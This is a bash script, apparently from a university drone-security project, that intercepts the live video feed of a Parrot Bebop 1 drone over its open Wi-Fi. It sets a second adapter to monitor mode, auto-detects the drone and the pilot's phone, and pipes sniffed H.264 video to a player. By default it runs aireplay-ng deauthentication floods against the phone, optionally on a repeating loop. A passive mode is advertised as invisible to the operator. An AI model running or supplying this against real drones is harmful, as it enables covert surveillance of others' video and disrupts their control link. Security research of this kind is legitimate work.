#!/bin/bash
# watch_bebop.sh - passive live video intercept of Bebop 1 on open Wi-Fi
# Uses the Alfa MT7612U for monitor mode while keeping the laptop's
# built-in Wi-Fi (wlp3s0 / NetworkManager) running for internet.

IFACE="wlx00c0cabe245c"        # Alfa MT7612U — monitor only
VENV="/home/sakar/UNR_Projects/BebopDrone/.venv37/bin/python3"
SCRIPT="/home/sakar/UNR_Projects/BebopDrone/live_parser.py"
FINDER="/home/sakar/UNR_Projects/BebopDrone/find_phone.py"
DRONEFINDER="/home/sakar/UNR_Projects/BebopDrone/find_drone.py"
SSID_PREFIX="${SSID_PREFIX:-BebopDrone}"   # how we recognise the drone's AP
BSSID="${BSSID:-}"             # auto-detected below; or export BSSID=AA:BB:..

# --- Active keyframe "kick" (NOT passive -- this TRANSMITS) --------------
# Deauthing the phone forces FreeFlight to reconnect, which makes the drone
# resend SPS/PPS + a fresh keyframe so the sniffed video resyncs clean.
# DO THIS ONLY WITH THE DRONE ON THE GROUND.
# All four are env-overridable, so watch_active.sh / watch_passive.sh can set
# them without editing this file.
DO_DEAUTH="${DO_DEAUTH:-1}"        # 1 = active (transmit), 0 = fully passive
DEAUTH_SECS="${DEAUTH_SECS:-3}"    # how long each kick lasts before reconnect
PHONE_MAC="${PHONE_MAC:-auto}"     # "auto" = detect it; or hardcode AA:BB:..
KICK_EVERY="${KICK_EVERY:-0}"      # >0 = re-kick every N seconds (continuous)

cleanup() {
    echo -e "\n[+] Stopping..."
    kill $(jobs -p) 2>/dev/null
    wait 2>/dev/null
    # restore Alfa to managed (laptop Wi-Fi was never touched)
    ip link set "$IFACE" down 2>/dev/null
    iw dev "$IFACE" set type managed 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    exit 0
}
trap cleanup SIGINT EXIT

# Tell NetworkManager to leave the Alfa alone permanently
# (only needs to run once, harmless to repeat)
NM_CONF="/etc/NetworkManager/conf.d/ignore-alfa.conf"
if [ ! -f "$NM_CONF" ]; then
    echo "[+] Telling NetworkManager to ignore $IFACE..."
    ALFA_MAC=$(cat /sys/class/net/"$IFACE"/address 2>/dev/null)
    sudo bash -c "cat > $NM_CONF" <<EOF
[keyfile]
unmanaged-devices=mac:${ALFA_MAC}
EOF
    sudo systemctl reload NetworkManager
    echo "[+] Done — NetworkManager will never touch $IFACE again."
fi

# Put the Alfa into monitor mode.
echo "[+] Putting $IFACE into monitor mode..."
sudo ip link set "$IFACE" down
sudo iw dev "$IFACE" set type monitor
sudo ip link set "$IFACE" up

# Auto-detect the drone's BSSID + channel in one scan (channel-hop + beacon
# sniff, matching the SSID prefix or Parrot's MAC OUI).  Override either by
# exporting BSSID=.. / CHANNEL=..; falls back to a manual airodump scan.
CHANNEL="${CHANNEL:-}"
if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "[+] Auto-detecting the drone (SSID '$SSID_PREFIX*')..."
    read -r DET_BSSID DET_CH < <(sudo "$VENV" "$DRONEFINDER" "$IFACE" "$SSID_PREFIX")
    [ -z "$BSSID" ] && BSSID="$DET_BSSID"
    [ -z "$CHANNEL" ] && CHANNEL="$DET_CH"
fi
if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "[!] Auto-detect failed. Manual scan — find your drone's AP, note"
    echo "    its BSSID and CH, then press Ctrl-C."
    sudo airodump-ng "$IFACE"
    echo ""
    [ -z "$BSSID" ] && read -p "Enter drone BSSID (MAC): " BSSID
    [ -z "$CHANNEL" ] && read -p "Enter channel number: " CHANNEL
fi

# Lock to channel
sudo iw dev "$IFACE" set channel "$CHANNEL"
echo "[+] Drone $BSSID — locked to channel $CHANNEL."

echo "[+] Starting live capture in 3s -> ffplay will open automatically."
sleep 3

# Live parse -> ffplay (uses venv python so scapy is available).
# mode v2 = RTP H.264 (this firmware streams RTP, SSRC="ARSS", STAP-A/FU-A).
# --prime injects captured 856x480 SPS/PPS so decoding can start immediately.
# Run in the BACKGROUND so we can fire a timed deauth while it keeps sniffing
# and catches the reconnect keyframe.
sudo "$VENV" "$SCRIPT" --live "$IFACE" --mode v2 --ffplay \
    --bssid "$BSSID" --prime &
PARSER_PID=$!

# One keyframe "kick": deauth the phone briefly so it reconnects and the drone
# resends SPS/PPS + a fresh keyframe (see README for why this cleans the feed).
kick() {
    echo "[+] Kicking the phone for ${DEAUTH_SECS}s to force a keyframe..."
    echo "    (TRANSMITTING now — drone must be on the ground.)"
    if [ -n "$PHONE_MAC" ] && [ "$PHONE_MAC" != "auto" ]; then
        echo "    target: $PHONE_MAC"
        sudo timeout "${DEAUTH_SECS}s" aireplay-ng --deauth 0 \
            -a "$BSSID" -c "$PHONE_MAC" "$IFACE"
    else
        echo "    target: broadcast (no specific phone MAC)"
        sudo timeout "${DEAUTH_SECS}s" aireplay-ng --deauth 0 \
            -a "$BSSID" "$IFACE"
    fi
    echo "[+] Deauth done; phone reconnecting -> watch for clean video."
}

if [ "$DO_DEAUTH" = "1" ]; then
    sleep 4                                  # let ffplay / sniffer come up

    if [ "$PHONE_MAC" = "auto" ]; then
        echo "[+] Detecting phone MAC..."
        PHONE_MAC="$(sudo "$VENV" "$FINDER" "$IFACE" "$BSSID")"
    fi

    kick                                     # first resync

    if [ "$KICK_EVERY" -gt 0 ] 2>/dev/null; then
        echo "[+] Continuous mode: re-kicking every ${KICK_EVERY}s."
        ( while kill -0 "$PARSER_PID" 2>/dev/null; do
              sleep "$KICK_EVERY"
              kill -0 "$PARSER_PID" 2>/dev/null && kick
          done ) &
    fi
else
    echo "[+] PASSIVE mode: never transmitting. The drone operator sees"
    echo "    nothing; video decodes only when a keyframe happens to pass"
    echo "    (start this BEFORE they open video for the best chance)."
fi

# Stay alive until Ctrl-C; cleanup() restores the adapter.
wait "$PARSER_PID"